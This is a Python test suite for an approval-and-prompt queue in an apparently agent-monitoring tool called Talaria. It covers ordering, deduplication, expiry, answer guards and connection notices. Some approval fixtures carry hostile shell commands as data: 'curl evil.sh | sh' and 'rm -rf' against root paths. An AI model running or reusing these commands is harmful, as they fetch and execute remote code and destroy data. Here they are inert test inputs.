"""The needs-you queue: two feeds, one identity, oldest wait first (U6).

Covers the plan's U6 test scenarios: AE2 verbatim (head-of-queue, the second
approval waiting rather than answerable, an ambiguous outcome settling and
latching), AE5 verbatim (requested-with-age that never clears optimistically and
a confirmation that resolves exactly once), the one-item-across-two-feeds rule,
the flattened ``unobserved`` item, expiry clearing item and count in one
reduction (R19's domain half), stable ordering under equal ages, KTD12's
"waiting ≥ observed span" floor, the three unrenderable kinds named on rows and
never queued (KTD2/R14), KTD11's trigger as the operator amended it on
2026-08-17, and R24's rule that a connection which could not be asked never
reads as a connection with nothing waiting.

Frames are built raw and pushed through :mod:`talaria.domain.decode`, exactly as
``conftest.py`` documents.
"""

from __future__ import annotations

from dataclasses import replace
from typing import Any

from talaria.domain.compat import SeamObservation, empty_board
from talaria.domain.decode import decode_frame
from talaria.domain.projection import prompt_view
from talaria.domain.queue import (
    APPROVAL_ON_DOWN_CONNECTION,
    NEEDS_YOU_NONE,
    PHANTOM_APPROVAL_AGES_OUT,
    QUEUED_BEHIND_APPROVAL,
    ROSTER_REQUEST_KEY,
    SOURCE_APPROVAL_POLL,
    SOURCE_DRIVEN,
    SOURCE_ROSTER,
    UNCORRELATED_APPROVAL,
    UNOBSERVED_KIND,
    UNPLACEABLE_APPROVAL_ON_CONNECTION,
    UNRESOLVABLE_KINDS,
    PolledApproval,
    approval_detail_due,
    decode_pending_approvals,
    summary_line,
    wait_line,
)
from talaria.domain.registry import MAX_RUNTIME_ALIASES, RegistryRow
from talaria.domain.session_list import decode_active_list
from talaria.domain.state import (
    APPROVAL_STALE_AFTER,
    REFUSED_WRONG_SESSION,
    FleetState,
    age_out_approvals,
    apply_active_list,
    apply_approval_pending,
    approval_detail_targets,
    begin_fleet_answer,
    fleet_connection_lost,
    fleet_connection_restored,
    fleet_queue,
    focus_session,
    latch_unservable_prompt,
    record_seam_board,
    respond_to_prompt,
    route_frame,
    route_frames,
    settle_queue_item,
    sync_queue,
)

from .conftest import BASE_TIME, raw_event

PROFILE = "default"
OTHER = "beta"


def decoded(frame: Any, *, at: float, seq: int) -> Any:
    return decode_frame(frame, at=at, seq=seq)


def probed(fleet: FleetState, profile: str = PROFILE, **statuses: str) -> FleetState:
    """A connection whose seams answered — ``roster`` and ``approval-detail``
    present unless a test says otherwise."""
    board = empty_board(profile)
    resolved = {"roster": "present", "approval-detail": "present", **statuses}
    board = replace(
        board,
        observations=tuple(
            replace(
                observation,
                status=resolved.get(observation.seam, observation.status),  # type: ignore[arg-type]
                source="probe" if observation.seam in resolved else observation.source,
                observed_at=BASE_TIME,
            )
            for observation in board.observations
        ),
        last_round_at=BASE_TIME,
    )
    return record_seam_board(fleet, profile=profile, board=board)


def active_list(*rows: dict[str, Any]) -> Any:
    return decode_active_list({"sessions": list(rows)})


def row(session: str, status: str, **extra: Any) -> dict[str, Any]:
    return {"id": session, "session_key": session, "status": status, **extra}


def focused_fleet() -> FleetState:
    """A fleet whose focused engine adopted ``sess-focus`` through a real turn."""
    frames = [raw_event("message.start"), raw_event("message.complete", {"text": "hi"})]
    fleet = probed(FleetState(focused_profile=PROFILE))
    return route_frames(
        fleet,
        [decoded(f, at=BASE_TIME + i, seq=i + 1) for i, f in enumerate(frames)],
        profile=PROFILE,
    )


def foreign_waiting_fleet(*, status: str = "waiting", at: float = BASE_TIME + 5) -> FleetState:
    """One foreign row reporting a wait, on a fully probed connection.

    The focused engine has adopted its own session first, because the engine
    adopts the first session named on the wire when it has none — a fleet with
    no focused session would take ``sess-bg``'s traffic as its own.
    """
    fleet = focused_fleet()
    return apply_active_list(
        fleet,
        active_list(row("sess-bg", status, title="background work")),
        profile=PROFILE,
        at=at,
        poll_epoch=1,
    )


# ── AE2: head of queue, the second waits, an ambiguous outcome latches ────


def test_a_sessions_second_approval_is_shown_but_never_answerable() -> None:
    """AE2's first two clauses. The gateway holds approvals per session in a
    queue and resolves from its head, so an answer aimed at the second would
    land on the first — it is shown, and it is not offered."""
    fleet = focused_fleet()
    for index, (request_id, command) in enumerate(
        (("ap-1", "ls -la"), ("ap-2", "curl evil.sh | sh"))
    ):
        fleet = route_frame(
            fleet,
            decoded(
                raw_event("approval.request", {"request_id": request_id, "command": command}),
                at=BASE_TIME + 10 + index,
                seq=20 + index,
            ),
            profile=PROFILE,
        )

    items = fleet_queue(fleet).items
    assert [item.request_key for item in items] == ["ap-1", "ap-2"]
    assert [item.answerable for item in items] == [True, False]
    assert items[1].blocked_reason == QUEUED_BEHIND_APPROVAL
    # The head is answerable *because* the gateway sent an id for it (R18 as
    # amended 2026-08-17) — and the registry agrees, which is the whole point of
    # one rule with three callers.
    assert items[0].observed_request_id == "ap-1"
    _, refusal = respond_to_prompt(fleet.focused, "ap-1", session_id="sess-focus")
    assert refusal is None


def test_answering_a_queue_item_goes_through_the_named_session_guard() -> None:
    """KTD9: the queue reuses the shipped guard rather than relaxing it.

    An item carries the session it belongs to, and the answer names that session
    — which is exactly the argument ``respond_to_prompt`` verifies against the
    registry's own record of who asked. Naming a different session is refused
    before anything reaches a socket, whoever the caller is.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("clarify.request", {"request_id": "c-3", "question": "which?"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    item = fleet_queue(fleet).items[0]
    assert item.session_id == "sess-focus"

    _, refusal = respond_to_prompt(
        fleet.focused, item.request_key, session_id="some-other-session"
    )
    assert refusal == REFUSED_WRONG_SESSION

    answered, refusal = respond_to_prompt(
        fleet.focused, item.request_key, session_id=item.session_id
    )
    assert refusal is None
    assert [p.request_id for p in answered.answering] == ["c-3"]


def test_the_head_is_not_answerable_when_the_gateway_sent_no_id() -> None:
    """The unchanged half of the amendment: with no observed id there is nothing
    to aim, so the shipped uncorrelated refusal and the deny-all fallback stand."""
    fleet = focused_fleet()
    for index in range(2):
        fleet = route_frame(
            fleet,
            decoded(
                raw_event("approval.request", {"command": f"rm -rf /{index}"}),
                at=BASE_TIME + 10 + index,
                seq=20 + index,
            ),
            profile=PROFILE,
        )

    items = fleet_queue(fleet).items
    assert len(items) == 2
    assert [item.answerable for item in items] == [False, False]
    assert items[0].blocked_reason == UNCORRELATED_APPROVAL
    assert items[1].blocked_reason == QUEUED_BEHIND_APPROVAL


def test_an_ambiguous_outcome_settles_and_latches_rather_than_restoring() -> None:
    """AE2's third clause. "Gateway not waiting" leaves Talaria unable to say
    whether the answer was applied; re-offering the control invites a second
    answer to a question that may already be answered."""
    fleet = foreign_waiting_fleet(status="working")
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "ap-9", "command": "rm -rf /data"}]},
            at=BASE_TIME + 6,
        ),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 6,
    )
    assert [item.request_key for item in fleet_queue(fleet).items] == ["ap-9"]

    settled = settle_queue_item(
        fleet, profile=PROFILE, session_id="sess-bg", request_key="ap-9", at=BASE_TIME + 7
    )
    assert settled.settled_items == ((PROFILE, "sess-bg", "ap-9"),)
    assert fleet_queue(settled).items == ()

    # The next poll still lists it — the gateway may never have applied the
    # answer — and the latch holds. This is the "never restores" half.
    still_listed = apply_approval_pending(
        settled,
        decode_pending_approvals(
            {"approvals": [{"request_id": "ap-9", "command": "rm -rf /data"}]},
            at=BASE_TIME + 8,
        ),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 8,
    )
    assert fleet_queue(still_listed).items == ()


# ── AE5: fire and observe ────────────────────────────────────────────────


def test_an_answer_in_flight_renders_requested_with_age_and_never_clears_itself() -> None:
    """AE5. The row renders requested-with-age for as long as the answer is
    travelling and is never shown resolved by the sending alone."""
    fleet = foreign_waiting_fleet(status="working")
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "ap-3", "command": "deploy"}]}, at=BASE_TIME + 6
        ),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 6,
    )
    fleet = begin_fleet_answer(
        fleet,
        profile=PROFILE,
        session_id="sess-bg",
        request_key="ap-3",
        at=BASE_TIME + 10,
    )

    item = fleet_queue(fleet).items[0]
    assert item.requested is True
    assert item.requested_at == BASE_TIME + 10
    assert item.answerable is False
    assert wait_line(item, BASE_TIME + 25) == "requested 15s ago"
    # Still there, still not resolved, however long nothing comes back.
    assert wait_line(item, BASE_TIME + 610) == "requested 600s ago"


def test_the_gateway_no_longer_listing_an_approval_is_what_resolves_it() -> None:
    """AE5's second half: a confirmation resolves the item exactly once, and it
    is the gateway's own silence about the entry — not the answer's departure —
    that says so."""
    fleet = foreign_waiting_fleet(status="working")
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "ap-4", "command": "deploy"}]}, at=BASE_TIME + 6
        ),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 6,
    )
    assert fleet_queue(fleet).count == 1

    confirmed = apply_approval_pending(
        fleet,
        decode_pending_approvals({"approvals": []}, at=BASE_TIME + 12),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 12,
    )
    assert confirmed.approval_detail == {}
    assert fleet_queue(confirmed).count == 0


def test_a_reply_that_did_not_answer_changes_nothing_at_all() -> None:
    """R10's fabricated zero, in the poll path: a malformed or absent reply is
    not the sentence "this session has no approvals"."""
    fleet = foreign_waiting_fleet(status="working")
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "ap-5", "command": "deploy"}]}, at=BASE_TIME + 6
        ),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 6,
    )
    unanswered = apply_approval_pending(
        fleet,
        decode_pending_approvals({"error": "boom"}, at=BASE_TIME + 9),
        profile=PROFILE,
        session_id="sess-bg",
        at=BASE_TIME + 9,
    )
    assert [item.request_key for item in fleet_queue(unanswered).items] == ["ap-5"]


# ── One identity across two feeds ────────────────────────────────────────


def test_a_driven_and_a_polled_sighting_of_one_approval_are_one_item() -> None:
    """The dedupe rule, both halves: identity first, session coverage second.
    A session Talaria attaches to mid-wait must not grow a second row for the
    prompt it was already watching."""
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"request_id": "ap-7", "command": "ship it"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-focus", "working", title="driven")),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "ap-7", "command": "ship it"}]}, at=BASE_TIME + 12
        ),
        profile=PROFILE,
        session_id="sess-focus",
        at=BASE_TIME + 12,
    )

    items = fleet_queue(fleet).items
    assert len(items) == 1
    assert items[0].source == SOURCE_DRIVEN
    # Feed A's stamp is authoritative, so the age is not a floor — the polled
    # sighting must not downgrade what Talaria actually watched arrive.
    assert items[0].age_is_floor is False
    assert items[0].opened_at == BASE_TIME + 10


def test_an_uncorrelated_driven_approval_labels_the_poll_rather_than_hiding_it() -> None:
    """A gateway that sends no id leaves the two feeds unable to be matched.

    This test asserted the opposite until 2026-08-17 — that feed B was skipped
    for a session feed A covered — and the behaviour it pinned lost real work.
    Talaria cannot tell whether the polled row IS the driven prompt, and every
    version of this rule that picked one to hide hid a live approval. So both are
    shown and the polled one carries the doubt, because showing an approval twice
    is visible and self-correcting while hiding one is neither.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "ship it"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-focus", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "uuid-from-the-gateway"}]}, at=BASE_TIME + 12
        ),
        profile=PROFILE,
        session_id="sess-focus",
        at=BASE_TIME + 12,
    )

    items = fleet_queue(fleet).items
    assert {item.request_key for item in items} == {
        "approval:sess-focus#1",
        "uuid-from-the-gateway",
    }
    polled = next(item for item in items if item.source == SOURCE_APPROVAL_POLL)
    driven = next(item for item in items if item.source == SOURCE_DRIVEN)
    assert polled.possibly_duplicate is True, "the doubt was not labelled"
    assert driven.possibly_duplicate is False, (
        "with its alias alive the driven copy anchors to its row and carries no "
        "doubt — a phantom's would, via the flag's second writer in _feed_a_items"
    )


# ── Feed B's flattened wait ──────────────────────────────────────────────


def test_a_foreign_waiting_session_yields_an_unobserved_item() -> None:
    """The gateway exposes only the flattened word for sessions other clients
    drive, so the honest kind is the one that says nobody has seen it."""
    fleet = foreign_waiting_fleet()
    items = fleet_queue(fleet).items
    assert len(items) == 1
    assert items[0].kind == UNOBSERVED_KIND
    assert items[0].source == SOURCE_ROSTER
    assert items[0].request_key == ROSTER_REQUEST_KEY
    assert items[0].session_title == "background work"


def test_a_working_foreign_row_is_not_a_queue_item_on_its_own() -> None:
    """``working`` is a session mid-turn. It is a trigger for asking about
    approvals (KTD11) and never, by itself, something that needs a person."""
    assert fleet_queue(foreign_waiting_fleet(status="working")).items == ()


# ── KTD12: the observation floor ─────────────────────────────────────────


def test_a_poll_first_seen_wait_renders_a_floor_and_never_a_start_time() -> None:
    """No row and no approval payload carries a start stamp at any revision U1
    examined, so the span since the first sighting is the only honest age."""
    fleet = foreign_waiting_fleet(at=BASE_TIME + 5)
    item = fleet_queue(fleet).items[0]
    assert item.age_is_floor is True
    assert item.opened_at == BASE_TIME + 5
    assert wait_line(item, BASE_TIME + 46) == "waiting ≥ 41s"

    # A second poll of the same unchanged wait does not restart the floor.
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting", title="background work")),
        profile=PROFILE,
        at=BASE_TIME + 40,
        poll_epoch=2,
    )
    assert wait_line(fleet_queue(fleet).items[0], BASE_TIME + 46) == "waiting ≥ 41s"


def test_a_watched_wait_renders_a_real_age_rather_than_a_floor() -> None:
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("clarify.request", {"request_id": "c-1", "question": "which branch?"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    item = fleet_queue(fleet).items[0]
    assert item.age_is_floor is False
    assert wait_line(item, BASE_TIME + 22) == "waiting 12s"


# ── R15: flat, oldest first, deterministic ───────────────────────────────


def test_the_queue_is_ordered_oldest_first_and_is_stable_under_equal_ages() -> None:
    """Two polled items share one poll's single stamp and carry no frame
    sequence of their own; without a total order the queue could reorder itself
    between two renders of identical state and AE8's determinism would be false."""
    fleet = probed(FleetState(focused_profile=PROFILE))
    fleet = probed(fleet, OTHER)
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-b", "waiting"), row("sess-a", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 20,
        poll_epoch=1,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-older", "waiting")),
        profile=OTHER,
        at=BASE_TIME + 5,
        poll_epoch=1,
    )

    keys = [(item.profile, item.session_id) for item in fleet_queue(fleet).items]
    assert keys == [(OTHER, "sess-older"), (PROFILE, "sess-a"), (PROFILE, "sess-b")]
    assert keys == [(item.profile, item.session_id) for item in fleet_queue(fleet).items]


# ── R19's domain half: one reduction clears item and count ───────────────


def test_an_expiry_clears_the_item_and_the_count_in_one_reduction() -> None:
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("clarify.request", {"request_id": "c-2", "question": "which?"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    assert fleet_queue(fleet).count == 1

    expired = route_frame(
        fleet,
        decoded(
            raw_event("clarify.expire", {"request_id": "c-2"}), at=BASE_TIME + 11, seq=21
        ),
        profile=PROFILE,
    )
    queue = fleet_queue(expired)
    assert queue.count == 0
    # The count is what this test is about, and it reached none. The summary is
    # no longer the BARE none — since CR7, every connection carries the standing
    # "foreign approval detail is not polled" line, so a fleet cannot report
    # itself fully asked while the poll is unassembled. Asserted as "the count
    # said none" rather than loosened to a substring, so a regression that put a
    # real item back would still fail here.
    assert queue.count == 0 and summary_line(queue, BASE_TIME + 11).startswith(
        NEEDS_YOU_NONE
    )


# ── R14: only resolvable items ───────────────────────────────────────────


def test_terminal_read_is_never_a_queue_item() -> None:
    """It is answered by machine from the transcript projection. A row asking
    the operator for it would be asking for something nobody is asking them."""
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("terminal.read.request", {"request_id": "t-1"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    assert fleet.focused.prompt_for("t-1") is not None
    assert fleet_queue(fleet).items == ()


def test_an_unrenderable_kind_is_named_on_its_row_and_never_queued() -> None:
    """The three kinds the running gateway blocks on that Talaria renders no
    card for (KTD2). Each is named on the registry row; none is a queue item."""
    for kind in UNRESOLVABLE_KINDS:
        fleet = focused_fleet()
        fleet = apply_active_list(
            fleet,
            active_list(row("sess-bg", "waiting")),
            profile=PROFILE,
            at=BASE_TIME + 5,
            poll_epoch=1,
        )
        fleet = route_frame(
            fleet,
            decoded(
                raw_event(f"{kind}.request", {"request_id": "x-1"}, session_id="sess-bg"),
                at=BASE_TIME + 6,
                seq=10,
            ),
            profile=PROFILE,
        )
        registry_row = fleet.rows[(PROFILE, "sess-bg")]
        assert registry_row.waiting_kind == kind
        assert kind in registry_row.last_notice
        assert "not queued" in registry_row.last_notice
        assert fleet_queue(fleet).items == (), f"{kind} was queued"

    # terminal_read is the fifth suppressed kind, and the one that arrives as a
    # KNOWN prompt event (``terminal.read.request``, state.py's ``_PROMPT_EVENTS``)
    # rather than an unknown type — the leg whose absence here let round nine's
    # defect through: named on the row exactly like the three above, never queued.
    fleet = focused_fleet()
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 5,
        poll_epoch=1,
    )
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "terminal.read.request", {"request_id": "t-8"}, session_id="sess-bg"
            ),
            at=BASE_TIME + 6,
            seq=10,
        ),
        profile=PROFILE,
    )
    registry_row = fleet.rows[(PROFILE, "sess-bg")]
    assert registry_row.waiting_kind == "terminal_read"
    assert "terminal_read" in registry_row.last_notice
    assert "not queued" in registry_row.last_notice
    assert fleet_queue(fleet).items == (), "terminal_read was queued"


def test_a_background_terminal_read_names_its_row_with_the_machine_wording() -> None:
    """Round nine's blocking defect, at the domain level. A background
    ``terminal.read.request`` is a KNOWN prompt event that never reaches the
    focused engine — ``route_frame`` sends it to its registry row — so
    ``latch_unservable_prompt`` never runs for it, and the queue suppresses the
    roster wait (``unresolvable_kind_of``). R14's whole bargain — named on the
    row AND never queued — therefore has to be kept by the row branch itself,
    with wording for a bridge Talaria answers by machine, not the "answer it in
    its own client" sentence the three human-client kinds carry.

    This drives ``route_frame`` directly, which is the reducer under test.
    Round ten found that a virtue only because the wiring above it was missing:
    the application still folded with ``apply_frame``, so this passed while the
    product named nothing. The application-level pin that closes that gap is
    ``test_a_background_terminal_read_names_its_row_through_the_running_app``
    in ``tests/ui/test_prompts.py``; keep both — this one guards the rule, that
    one guards the wiring."""
    fleet = focused_fleet()
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 5,
        poll_epoch=1,
    )
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "terminal.read.request", {"request_id": "t-9"}, session_id="sess-bg"
            ),
            at=BASE_TIME + 6,
            seq=10,
        ),
        profile=PROFILE,
    )
    registry_row = fleet.rows[(PROFILE, "sess-bg")]
    assert registry_row.waiting_kind == "terminal_read"
    assert "terminal_read" in registry_row.last_notice
    assert "not queued" in registry_row.last_notice
    # The machine-bridge wording, not the human-client sentence: nothing tells
    # the operator to go answer a terminal read by hand somewhere else.
    assert "machine" in registry_row.last_notice
    assert "own client" not in registry_row.last_notice
    # Never queued, and no prompt ever registered for the machine to answer.
    assert fleet_queue(fleet).items == ()
    assert fleet.focused.prompt_for("t-9", session_id="sess-bg") is None


def test_a_queueable_kind_on_the_same_branch_writes_no_suppression_notice() -> None:
    """The reach guard for writing notices from the known-prompt branch: that
    branch handles every prompt event, and the four queueable kinds must pass
    through it untouched — no notice, and the roster item still typed."""
    fleet = focused_fleet()
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 5,
        poll_epoch=1,
    )
    before = fleet.rows[(PROFILE, "sess-bg")].last_notice
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "clarify.request",
                {"request_id": "c-9", "question": "which?"},
                session_id="sess-bg",
            ),
            at=BASE_TIME + 6,
            seq=10,
        ),
        profile=PROFILE,
    )
    registry_row = fleet.rows[(PROFILE, "sess-bg")]
    assert registry_row.waiting_kind == "clarify"
    assert registry_row.last_notice == before
    assert [item.kind for item in fleet_queue(fleet).items] == ["clarify"]


def test_a_focused_terminal_read_still_registers_its_prompt_for_the_machine() -> None:
    """The focused half is unchanged by the row notice: the prompt registers,
    the render pass's dispatch surface (``prompt_view``) still carries it for
    ``answer_terminal_read``, and it is still never a queue item."""
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("terminal.read.request", {"request_id": "t-1"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    assert fleet.focused.prompt_for("t-1") is not None
    assert any(
        prompt_row.kind == "terminal_read"
        for prompt_row in prompt_view(fleet.focused).rows
    )
    assert fleet_queue(fleet).items == ()


# ── The stale-kind finding: a named kind must not outlive its own wait ────


def test_a_kind_named_before_a_connection_drop_does_not_suppress_a_later_wait() -> None:
    """The reachable staleness: ``terminal.read.expire`` is emitted once, to the
    session's transport of that moment (``tui_gateway/server.py``, ``_block``'s
    expire emission and ``write_json``'s routing), so a connection dropped
    across the expire never sees the clear. The first poll of the new
    connection that reports ``waiting`` is reporting a wait the broken stream
    never described — the kind flattens to ``unobserved`` and the wait queues,
    rather than every later wait on the row being suppressed forever."""
    fleet = focused_fleet()
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "working")),
        profile=PROFILE,
        at=BASE_TIME + 5,
        poll_epoch=1,
    )
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "terminal.read.request", {"request_id": "t-9"}, session_id="sess-bg"
            ),
            at=BASE_TIME + 6,
            seq=10,
        ),
        profile=PROFILE,
    )
    fleet = fleet_connection_lost(fleet, profile=PROFILE, at=BASE_TIME + 7)
    fleet = fleet_connection_restored(
        fleet, profile=PROFILE, generation=1, at=BASE_TIME + 40
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 41,
        poll_epoch=2,
    )
    registry_row = fleet.rows[(PROFILE, "sess-bg")]
    assert registry_row.waiting_kind == UNOBSERVED_KIND
    assert [(item.session_id, item.kind) for item in fleet_queue(fleet).items] == [
        ("sess-bg", UNOBSERVED_KIND)
    ]


def test_a_poll_reporting_any_other_status_ends_the_named_wait() -> None:
    """A fresh poll's status word is the gateway's own lifecycle claim: a row
    polled ``working`` (or ``idle``) is not waiting on anything, so the kind an
    event once named is over and clears — which is what stops a machine-answered
    terminal read (nothing emits an ``.expire`` for an ANSWERED read) from
    riding the row into its next, unrelated wait and suppressing it."""
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "terminal.read.request", {"request_id": "t-9"}, session_id="sess-bg"
            ),
            at=BASE_TIME + 6,
            seq=10,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "working")),
        profile=PROFILE,
        at=BASE_TIME + 8,
        poll_epoch=1,
    )
    assert fleet.rows[(PROFILE, "sess-bg")].waiting_kind == ""
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 9,
        poll_epoch=2,
    )
    assert [(item.session_id, item.kind) for item in fleet_queue(fleet).items] == [
        ("sess-bg", UNOBSERVED_KIND)
    ]


def test_a_named_kind_survives_a_continuous_waiting_poll_unbroken() -> None:
    """The other leg of both staleness clears: on an unbroken connection a poll
    that still says ``waiting`` refines nothing away — a queueable kind keeps
    its type and a suppressed kind keeps its suppression and its notice."""
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "clarify.request",
                {"request_id": "c-9", "question": "which?"},
                session_id="sess-bg",
            ),
            at=BASE_TIME + 6,
            seq=10,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 7,
        poll_epoch=1,
    )
    assert fleet.rows[(PROFILE, "sess-bg")].waiting_kind == "clarify"
    assert [item.kind for item in fleet_queue(fleet).items] == ["clarify"]

    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "terminal.read.request", {"request_id": "t-9"}, session_id="sess-bg"
            ),
            at=BASE_TIME + 6,
            seq=10,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 7,
        poll_epoch=1,
    )
    registry_row = fleet.rows[(PROFILE, "sess-bg")]
    assert registry_row.waiting_kind == "terminal_read"
    assert "not queued" in registry_row.last_notice
    assert fleet_queue(fleet).items == ()


def test_a_reclaimed_session_contributes_no_item() -> None:
    fleet = foreign_waiting_fleet()
    assert fleet_queue(fleet).count == 1
    reclaimed = route_frame(
        fleet,
        decoded(
            raw_event("session.reclaimed", {"reason": "idle"}, session_id="sess-bg"),
            at=BASE_TIME + 9,
            seq=11,
        ),
        profile=PROFILE,
    )
    assert fleet_queue(reclaimed).items == ()
    assert reclaimed.rows[(PROFILE, "sess-bg")].lifecycle() == "reclaimed(idle)"


# ── KTD11's gate, as the operator amended it on 2026-08-17 ───────────────


def test_approval_detail_fires_at_waiting_and_working_and_nothing_else() -> None:
    """The safety property, checkable by pointing at code: ``idle`` excluded,
    ``starting`` excluded, ``working`` included, ``waiting`` included, and no
    path firing at a row of unknown status."""
    for status, expected in (
        ("waiting", True),
        ("working", True),
        ("idle", False),
        ("starting", False),
        ("", False),
        ("some-word-this-gateway-invented", False),
    ):
        candidate = RegistryRow(profile=PROFILE, durable_id="s", status=status)
        assert approval_detail_due(candidate, seam="present") is expected, status


def test_approval_detail_is_never_asked_of_a_seam_that_did_not_answer() -> None:
    live = RegistryRow(profile=PROFILE, durable_id="s", status="waiting")
    assert approval_detail_due(live, seam=None) is False
    assert approval_detail_due(live, seam="absent") is False
    assert approval_detail_due(live, seam="parameter-invalid") is False
    assert approval_detail_due(live, seam="degraded") is False


def test_approval_detail_targets_are_the_gated_rows_of_one_connection() -> None:
    fleet = probed(FleetState(focused_profile=PROFILE))
    fleet = apply_active_list(
        fleet,
        active_list(
            row("sess-idle", "idle"),
            row("sess-start", "starting"),
            row("sess-work", "working"),
            row("sess-wait", "waiting"),
        ),
        profile=PROFILE,
        at=BASE_TIME + 5,
        poll_epoch=1,
    )
    assert approval_detail_targets(fleet, PROFILE) == ("sess-wait", "sess-work")

    dark = record_seam_board(
        fleet,
        profile=PROFILE,
        board=replace(
            empty_board(PROFILE),
            observations=tuple(
                replace(o, status="absent" if o.seam == "approval-detail" else o.status)
                for o in empty_board(PROFILE).observations
            ),
        ),
    )
    assert approval_detail_targets(dark, PROFILE) == ()
    assert approval_detail_targets(fleet, "a-profile-with-no-board") == ()


# ── R24: an empty queue must never mean "we could not ask" ───────────────


def test_a_connection_whose_probe_failed_is_named_rather_than_silent() -> None:
    """The failure R24 exists for: a connection that answers no roster and no
    approvals is, from the items alone, indistinguishable from a connection with
    nothing waiting on it — and those are different facts."""
    fleet = probed(FleetState(focused_profile=PROFILE), roster="absent")
    queue = fleet_queue(fleet)
    assert queue.is_empty
    assert any("roster absent" in notice for notice in queue.notices)
    assert summary_line(queue, BASE_TIME) != NEEDS_YOU_NONE
    assert "could not be asked" in summary_line(queue, BASE_TIME)


def test_a_never_probed_connection_is_named_as_never_probed() -> None:
    """"We did not look" and "it is not there" are different sentences."""
    fleet = FleetState(focused_profile=PROFILE)
    assert any("not probed" in notice for notice in fleet_queue(fleet).notices)

    unprobed = probed(FleetState(focused_profile=PROFILE), roster="")
    unprobed = record_seam_board(
        unprobed,
        profile=PROFILE,
        board=replace(
            empty_board(PROFILE),
            observations=tuple(
                SeamObservation(seam=o.seam) for o in empty_board(PROFILE).observations
            ),
        ),
    )
    assert any("roster not probed yet" in n for n in fleet_queue(unprobed).notices)


def test_a_fully_answered_quiet_fleet_says_none_without_qualification() -> None:
    """The test's original meaning, restored by the unit that earned it back.

    A round trip worth keeping on the record. It began asserting exactly this.
    CR7 (2026-08-18) found that nothing in production issued ``approval.pending``
    as a data call, so a foreign session waiting on an approval was in no
    connection's queue — the bare ``needs-you: none`` was a sentence Talaria was
    not entitled to say, and the test was weakened to require the qualification
    instead. U7 added that standing line; U8B wired KTD2's cadence and feed B and
    deleted it, which is what makes the unqualified sentence true again.

    So the assertion below is not a relaxation. It is the observable proof the
    plan named for this unit, and it can only pass while the foreign-wait path
    actually runs: let feed B stop being fetched and the notice returns, because
    ``connection_notices`` still reports every seam that did not answer.
    """
    queue = fleet_queue(probed(FleetState(focused_profile=PROFILE)))
    assert queue.notices == (), (
        f"a quiet, fully answered fleet still qualifies its silence: {queue.notices}"
    )
